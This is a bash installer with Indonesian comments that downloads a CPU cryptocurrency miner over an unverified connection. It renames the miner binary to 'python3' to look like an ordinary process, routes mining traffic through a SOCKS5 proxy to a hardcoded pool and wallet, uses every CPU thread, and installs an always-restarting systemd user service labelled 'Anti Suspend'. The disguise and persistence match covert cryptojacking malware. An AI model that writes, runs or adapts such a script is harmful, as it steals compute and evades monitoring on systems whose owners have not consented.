#!/bin/bash

# ===============================
# 🛡️ GENZO MINER + SOCKS5 PROXY
# ===============================
# Author: Ram Danis + ChatGPT
# Desc: Autoinstall miner with systemd --user and SOCKS5 proxy support
# ===============================

# === KONFIGURASI ===
PROXY="127.0.0.1:1080"       # Ganti dengan SOCKS5 Anda
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
POOL="stratum+tcp://159.223.48.143:443"
THREADS=$(nproc --all)
MINER_DIR="$HOME/miner_temp"
BIN_PATH="$HOME/.local/bin"
SERVICE_PATH="$HOME/.config/systemd/user"
MINER_SCRIPT="$BIN_PATH/genzo_miner_proxy.sh"
SERVICE_FILE="$SERVICE_PATH/genzo_miner_proxy.service"

echo "[✔] Membuat direktori..."
mkdir -p "$BIN_PATH" "$SERVICE_PATH" "$MINER_DIR"

# === DETEKSI TOOL PROXY ===
PROXY_TOOL=""
if command -v proxychains4 &>/dev/null; then
  PROXY_TOOL="proxychains4"
elif command -v tsocks &>/dev/null; then
  PROXY_TOOL="tsocks"
else
  echo "[❌] Tidak ada proxy tool ditemukan. Install salah satu:"
  echo "    sudo apt install proxychains4"
  echo "atau sudo apt install tsocks"
  exit 1
fi

echo "[✔] Menggunakan proxy tool: $PROXY_TOOL"

# === KONFIGURASI FILE ===
if [ "$PROXY_TOOL" = "proxychains4" ]; then
  echo "[✔] Menulis konfigurasi proxychains4..."
  mkdir -p "$HOME/.proxychains"
  cat > "$HOME/.proxychains/proxychains.conf" <<EOF
strict_chain
quiet_mode
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 $PROXY
EOF
  PROXY_CMD="proxychains4 -f $HOME/.proxychains/proxychains.conf"
else
  echo "[✔] Menulis konfigurasi tsocks..."
  mkdir -p "$HOME/.tsocks"
  cat > "$HOME/.tsocks/tsocks.conf" <<EOF
server = ${PROXY%:*}
server_port = ${PROXY##*:}
server_type = 5
EOF
  export TSOCKS_CONF_FILE="$HOME/.tsocks/tsocks.conf"
  PROXY_CMD="tsocks"
fi

# === SCRIPT MINER ===
echo "[✔] Menulis script miner proxy ke: $MINER_SCRIPT"
cat > "$MINER_SCRIPT" <<EOF
#!/bin/bash
while true; do
  if pgrep -x "python3" > /dev/null; then
    echo "[INFO] Miner aktif, tidur 60s..."
    sleep 60
  else
    cd "$MINER_DIR" || mkdir -p "$MINER_DIR" && cd "$MINER_DIR"
    wget -q --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 python3
    chmod +x python3
    echo "[INFO] Menjalankan miner melalui proxy..."
    $PROXY_CMD ./python3 -a power2b -o $POOL -u $WALLET -p x -t$THREADS > /dev/null 2>&1 &
  fi
  sleep 60
done
EOF

chmod +x "$MINER_SCRIPT"

# === SERVICE FILE ===
echo "[✔] Menulis systemd user service..."
cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Genzo Miner + Proxy Anti Suspend
After=network.target

[Service]
ExecStart=$MINER_SCRIPT
Restart=always
RestartSec=5
KillMode=process
Environment=TSOCKS_CONF_FILE=$HOME/.tsocks/tsocks.conf

[Install]
WantedBy=default.target
EOF

# === ENABLE SERVICE ===
echo "[✔] Mengaktifkan service systemd user..."
systemctl --user daemon-reexec
systemctl --user daemon-reload
systemctl --user enable genzo_miner_proxy.service
systemctl --user restart genzo_miner_proxy.service

echo ""
echo "[✅ SELESAI] Miner + SOCKS5 berhasil dijalankan."
echo "Status: systemctl --user status genzo_miner_proxy.service"
